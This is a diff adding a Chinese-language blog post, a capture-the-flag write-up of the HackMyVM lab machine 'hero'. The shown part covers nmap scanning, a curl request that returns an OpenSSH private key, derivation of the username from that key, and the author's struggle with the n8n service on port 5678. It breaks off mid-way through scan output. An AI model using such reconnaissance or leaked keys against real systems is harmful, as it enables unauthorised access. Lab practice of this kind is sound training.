@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="HMV-hero靶机复盘">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HMV-hero">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/20816.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="HMV-hero靶机复盘">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67a62239d0e0a243d4fca307.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67a62298d0e0a243d4fca311.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67a6229bd0e0a243d4fca313.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67a6229cd0e0a243d4fca314.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67a62297d0e0a243d4fca310.png">
+<meta property="article:published_time" content="2025-02-07T07:56:50.000Z">
+<meta property="article:modified_time" content="2025-02-07T15:19:50.797Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="HMV">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67a62239d0e0a243d4fca307.png">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/20816.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>HMV-hero | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">12</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">9</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">44</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/20816.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HMV-hero
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-02-07 15:56:50 / 修改时间：23:19:50" itemprop="dateCreated datePublished" datetime="2025-02-07T15:56:50+08:00">2025-02-07</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/hmv/" itemprop="url" rel="index"><span itemprop="name">hmv</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+        <div class="out-img-topic">
+          <img src="https://pic1.imgdb.cn/item/67a6221ad0e0a243d4fca2fe.png" class="img-topic">
+        </div>
+      
+      
+        <p>HMV-hero靶机复盘</p>
+<span id="more"></span>
+<p><img src="https://pic1.imgdb.cn/item/67a62239d0e0a243d4fca307.png"></p>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.179.180</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">07</span> <span class="number">15</span>:<span class="number">58</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">179.180</span> (<span class="number">192.168</span>.<span class="number">179.180</span>)</span><br><span class="line">Host is up (<span class="number">0.0071</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE    SERVICE         VERSION</span><br><span class="line"><span class="number">53</span><span class="symbol">/tcp</span>   open     domain          dnsmasq <span class="number">2.51</span></span><br><span class="line">| <span class="params">dns-nsid:</span> </span><br><span class="line">|_  bind.<span class="params">version:</span> dnsmasq-<span class="number">2.51</span></span><br><span class="line"><span class="number">8081</span><span class="symbol">/tcp</span> filtered blackice-icecap</span><br><span class="line">MAC <span class="params">Address:</span> AE:<span class="number">01</span>:<span class="number">4</span>B:<span class="number">69</span>:<span class="number">88</span>:D3 (Unknown)</span><br><span class="line">Device <span class="params">type:</span> phone</span><br><span class="line"><span class="params">Running:</span> Google Android <span class="number">10</span>.X, Linux <span class="number">4</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:google:android:<span class="number">10</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span></span><br><span class="line">OS <span class="params">details:</span> Android <span class="number">9</span> <span class="operator">-</span> <span class="number">10</span> (Linux <span class="number">4.9</span> <span class="operator">-</span> <span class="number">4.14</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">7.15</span> ms <span class="number">192.168</span>.<span class="number">179.180</span> (<span class="number">192.168</span>.<span class="number">179.180</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">20.09</span> seconds</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>访问80端口得到ssh私钥 然后生成公钥 得到用户名</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># curl 192.168.179.81</span></span><br><span class="line"><span class="params">-----BEGIN</span> OPENSSH PRIVATE KEY<span class="params">-----</span></span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW</span><br><span class="line">QyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwgAAAJAczctSHM3L</span><br><span class="line">UgAAAAtzc2gtZWQyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwg</span><br><span class="line">AAAEAnYotUqBFoopjEVz9Sa9viQ8AhNVTx0K19TC7YQyfwAqiYY31x+ZMvvHfmGWC7ZE75</span><br><span class="line">BbdbAKYEtIX75k6CL27CAAAACnNoYXdhQGhlcm8BAgM=</span><br><span class="line"><span class="params">-----END</span> OPENSSH PRIVATE KEY<span class="params">-----</span></span><br><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># ssh-keygen -y -f tmp</span></span><br><span class="line">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKiYY31x+ZMvvHfmGWC7ZE75BbdbAKYEtIX75k6CL27C shawa@hero</span><br></pre></td></tr></table></figure>
+<p>接下来有硬控了我好久好久：<br>看大佬们用<a target="_blank" rel="noopener" href="https://github.com/n8n-io/n8n%E4%B8%AD%E7%9A%84ssh%E8%BF%9E%E6%8E%A5%EF%BC%8C%E6%88%91%E5%8D%A1%E4%BA%86%E5%BE%88%E4%B9%85%E3%80%82%E8%AE%B2%E8%AE%B2%E6%88%91%E7%9A%84%E5%BF%83%E8%B7%AF%E5%8E%86%E7%A8%8B%EF%BC%9A">https://github.com/n8n-io/n8n中的ssh连接，我卡了很久。讲讲我的心路历程：</a><br>大家一起打靶机，然后发这个n8n的github地址和使用的界面，而且这个n8n还是一个工具，用法也是用docker打开，但是我从来没见过，这个靶机也没有开放22端口，我以为大佬们用这个工具来应对这种情况。而且我在本机运行这个服务的界面也是一模一样的。<br>使用方式是这样的：<br><img src="https://pic1.imgdb.cn/item/67a62298d0e0a243d4fca311.png"><br>在首页点击credentials然后add，点击添加，选择ssh私钥的选项，然后输入ip，用户名，私钥。<br>问题就来了：我始终连不上，看大佬们说用172.17.0.1，因为这个服务在docker上跑的（这里更加深了我的误解），但是我就是死活连不上，并且我一直相信是不是我的配置哪里出错了，然后就上网一直搜docker的配置，我连接不上的显示是端口拒绝连接，我也去docker内部发现没有ssh服务打开，然后整了半天，docker的内容也搜了半天，最后实在搞不下去了，就是连接不上。我就想着我自己能不能找到别的出路。<br>这时候我发现：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -p- 192.168.179.81                             </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">07</span> <span class="number">21</span>:<span class="number">31</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">179.81</span>)</span><br><span class="line">Host is up (<span class="number">0.0017</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">65533</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span>   open  http</span><br><span class="line"><span class="number">5678</span><span class="symbol">/tcp</span> open  rrac</span><br><span class="line">MAC <span class="params">Address:</span> DE:<span class="number">86</span>:<span class="number">60</span>:<span class="number">02</span>:F4:<span class="number">97</span> (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">2.13</span> seconds</span><br><span class="line"></span><br><span class="line">                                                                                                                    </span><br><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.179.81 -p 5678</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">07</span> <span class="number">21</span>:<span class="number">32</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">179.81</span>)</span><br><span class="line">Host is up (<span class="number">0.0034</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">5678</span><span class="symbol">/tcp</span> open  rrac<span class="operator">?</span></span><br><span class="line">| <span class="params">fingerprint-strings:</span> </span><br><span class="line">|   <span class="params">GetRequest:</span> </span><br><span class="line">|     HTTP<span class="symbol">/1.1</span> <span class="number">200</span> OK</span><br><span class="line">|     <span class="params">Accept-Ranges:</span> bytes</span><br><span class="line">|     <span class="params">Cache-Control:</span> public, max-age<span class="operator">=</span><span class="number">86400</span></span><br><span class="line">|     <span class="params">Last-Modified:</span> Fri, <span class="number">07</span> Feb <span class="number">2025</span> <span class="number">12</span>:<span class="number">36</span>:<span class="number">13</span> GMT</span><br><span class="line">|     <span class="params">ETag:</span> W<span class="operator">/</span><span class="string">&quot;7b7-194e0691fac&quot;</span></span><br><span class="line">|     <span class="params">Content-Type:</span> text<span class="symbol">/html</span>; <span class="attr">charset</span><span class="operator">=</span>UTF-<span class="number">8</span></span><br><span class="line">|     <span class="params">Content-Length:</span> <span class="number">1975</span></span><br><span class="line">|     <span class="params">Vary:</span> Accept-Encoding</span><br><span class="line">|     <span class="params">Date:</span> Fri, <span class="number">07</span> Feb <span class="number">2025</span> <span class="number">13</span>:<span class="number">32</span>:<span class="number">19</span> GMT</span><br><span class="line">|     <span class="params">Connection:</span> close</span><br><span class="line">|     <span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE html<span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>html lang<span class="operator">=</span><span class="string">&quot;en&quot;</span><span class="operator">&gt;</span></span><br><span class="line">|     <span class="symbol">&lt;head&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>script type<span class="operator">=</span><span class="string">&quot;module&quot;</span> crossorigin src<span class="operator">=</span><span class="string">&quot;/assets/polyfills-DfOJfMlf.js&quot;</span><span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">/</span>script<span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>meta charset<span class="operator">=</span><span class="string">&quot;utf-8&quot;</span> <span class="operator">/</span><span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>meta http-equiv<span class="operator">=</span><span class="string">&quot;X-UA-Compatible&quot;</span> content<span class="operator">=</span><span class="string">&quot;IE=edge&quot;</span> <span class="operator">/</span><span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>meta name<span class="operator">=</span><span class="string">&quot;viewport&quot;</span> content<span class="operator">=</span><span class="string">&quot;width=device-width,initial-scale=1.0&quot;</span> <span class="operator">/</span><span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>link rel<span class="operator">=</span><span class="string">&quot;icon&quot;</span> href<span class="operator">=</span><span class="string">&quot;/favicon.ico&quot;</span> <span class="operator">/</span><span class="operator">&gt;</span></span><br><span class="line">|     <span class="symbol">&lt;style&gt;</span>@media (<span class="params">prefers-color-scheme:</span> dark) &#123; body &#123; <span class="params">background-color:</span> rgb(<span class="number">45</span>, <span class="number">46</span>, <span class="number">46</span>) &#125; &#125;<span class="operator">&lt;</span><span class="operator">/</span>style<span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>script type<span class="operator">=</span><span class="string">&quot;text/javascript&quot;</span><span class="operator">&gt;</span></span><br><span class="line">|     window.BASE_PATH <span class="operator">=</span> &#x27;<span class="operator">/</span>&#x27;;</span><br><span class="line">|     window.REST_ENDPOINT <span class="operator">=</span> &#x27;rest&#x27;;</span><br><span class="line">|     <span class="operator">&lt;</span><span class="operator">/</span>script<span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>script src<span class="operator">=</span><span class="string">&quot;/rest/sentry.js&quot;</span><span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">/</span>script<span class="operator">&gt;</span></span><br><span class="line">|     <span class="symbol">&lt;script&gt;</span><span class="operator">!</span>function(t,e)&#123;var o,n,</span><br><span class="line">|   HTTPOptions, <span class="params">RTSPRequest:</span> </span><br><span class="line">|     HTTP<span class="symbol">/1.1</span> <span class="number">404</span> Not Found</span><br><span class="line">|     <span class="params">Content-Security-Policy:</span> default-src &#x27;none&#x27;</span><br><span class="line">|     <span class="params">X-Content-Type-Options:</span> nosniff</span><br><span class="line">|     <span class="params">Content-Type:</span> text<span class="symbol">/html</span>; <span class="attr">charset</span><span class="operator">=</span>utf-<span class="number">8</span></span><br><span class="line">|     <span class="params">Content-Length:</span> <span class="number">143</span></span><br><span class="line">|     <span class="params">Vary:</span> Accept-Encoding</span><br><span class="line">|     <span class="params">Date:</span> Fri, <span class="number">07</span> Feb <span class="number">2025</span> <span class="number">13</span>:<span class="number">32</span>:<span class="number">19</span> GMT</span><br><span class="line">|     <span class="params">Connection:</span> close</span><br><span class="line">|     <span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE html<span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>html lang<span class="operator">=</span><span class="string">&quot;en&quot;</span><span class="operator">&gt;</span></span><br><span class="line">|     <span class="symbol">&lt;head&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>meta charset<span class="operator">=</span><span class="string">&quot;utf-8&quot;</span><span class="operator">&gt;</span></span><br><span class="line">|     <span class="symbol">&lt;title&gt;</span>Error<span class="operator">&lt;</span><span class="operator">/</span>title<span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span><span class="operator">/</span>head<span class="operator">&gt;</span></span><br><span class="line">|     <span class="symbol">&lt;body&gt;</span></span><br><span class="line">|     <span class="symbol">&lt;pre&gt;</span>Cannot OPTIONS <span class="operator">/</span><span class="operator">&lt;</span><span class="operator">/</span>pre<span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span><span class="operator">/</span>body<span class="operator">&gt;</span></span><br><span class="line">|_    <span class="operator">&lt;</span><span class="operator">/</span>html<span class="operator">&gt;</span></span><br><span class="line"><span class="number">1</span> service unrecognized despite returning data. If you know the service<span class="operator">/</span>version, please submit the following fingerprint at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>cgi-bin<span class="operator">/</span>submit.cgi<span class="operator">?</span><span class="params">new-service :</span></span><br><span class="line">SF-Port5678-TCP:V<span class="operator">=</span><span class="number">7.95</span>%I<span class="operator">=</span><span class="number">7</span>%D<span class="operator">=</span><span class="number">2</span><span class="operator">/</span><span class="number">7</span>%Time<span class="operator">=</span><span class="number">67</span>A60B63%P<span class="operator">=</span>aarch64-unknown-linux-gnu</span><br><span class="line">SF:%r(GetRequest,<span class="number">8</span>DC,<span class="string">&quot;HTTP/1<span class="char escape_">\.</span>1<span class="char escape_">\x</span>20200<span class="char escape_">\x</span>20OK<span class="char escape_">\r</span><span class="char escape_">\n</span>Accept-Ranges:<span class="char escape_">\x</span>20bytes<span class="char escape_">\r</span>\</span></span><br><span class="line"><span class="string">SF:nCache-Control:<span class="char escape_">\x</span>20public,<span class="char escape_">\x</span>20max-age=86400<span class="char escape_">\r</span><span class="char escape_">\n</span>Last-Modified:<span class="char escape_">\x</span>20Fri,<span class="char escape_">\x</span></span></span><br><span class="line"><span class="string">SF:2007<span class="char escape_">\x</span>20Feb<span class="char escape_">\x</span>202025<span class="char escape_">\x</span>2012:36:13<span class="char escape_">\x</span>20GMT<span class="char escape_">\r</span><span class="char escape_">\n</span>ETag:<span class="char escape_">\x</span>20W/<span class="char escape_">\&quot;</span>7b7-194e0691fac\</span></span><br><span class="line"><span class="string">SF:&quot;</span>\r\nContent-Type:\x20text<span class="symbol">/html</span>;\x20charset<span class="operator">=</span>UTF-<span class="number">8</span>\r\nContent-Length:\x2</span><br><span class="line">SF:<span class="number">01975</span>\r\nVary:\x20Accept-Encoding\r\nDate:\x20Fri,\x2007\x20Feb\x202025</span><br><span class="line">SF:\x2013:<span class="number">32</span>:<span class="number">19</span>\x20GMT\r\nConnection:\x20close\r\n\r\n<span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE\x20html<span class="operator">&gt;</span>\n</span><br><span class="line">SF:<span class="operator">&lt;</span>html\x20lang<span class="operator">=</span>\<span class="string">&quot;en<span class="char escape_">\&quot;</span>&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span>&lt;head&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;script<span class="char escape_">\x</span>20type=<span class="char escape_">\&quot;</span>module<span class="char escape_">\&quot;</span><span class="char escape_">\x</span>20cros</span></span><br><span class="line"><span class="string">SF:sorigin<span class="char escape_">\x</span>20src=<span class="char escape_">\&quot;</span>/assets/polyfills-DfOJfMlf<span class="char escape_">\.</span>js<span class="char escape_">\&quot;</span>&gt;&lt;/script&gt;<span class="char escape_">\n</span><span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;met</span></span><br><span class="line"><span class="string">SF:a<span class="char escape_">\x</span>20charset=<span class="char escape_">\&quot;</span>utf-8<span class="char escape_">\&quot;</span><span class="char escape_">\x</span>20/&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;meta<span class="char escape_">\x</span>20http-equiv=<span class="char escape_">\&quot;</span>X-UA-Compatible</span></span><br><span class="line"><span class="string">SF:<span class="char escape_">\&quot;</span><span class="char escape_">\x</span>20content=<span class="char escape_">\&quot;</span>IE=edge<span class="char escape_">\&quot;</span><span class="char escape_">\x</span>20/&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;meta<span class="char escape_">\x</span>20name=<span class="char escape_">\&quot;</span>viewport<span class="char escape_">\&quot;</span><span class="char escape_">\x</span>20cont</span></span><br><span class="line"><span class="string">SF:ent=<span class="char escape_">\&quot;</span>width=device-width,initial-scale=1<span class="char escape_">\.</span>0<span class="char escape_">\&quot;</span><span class="char 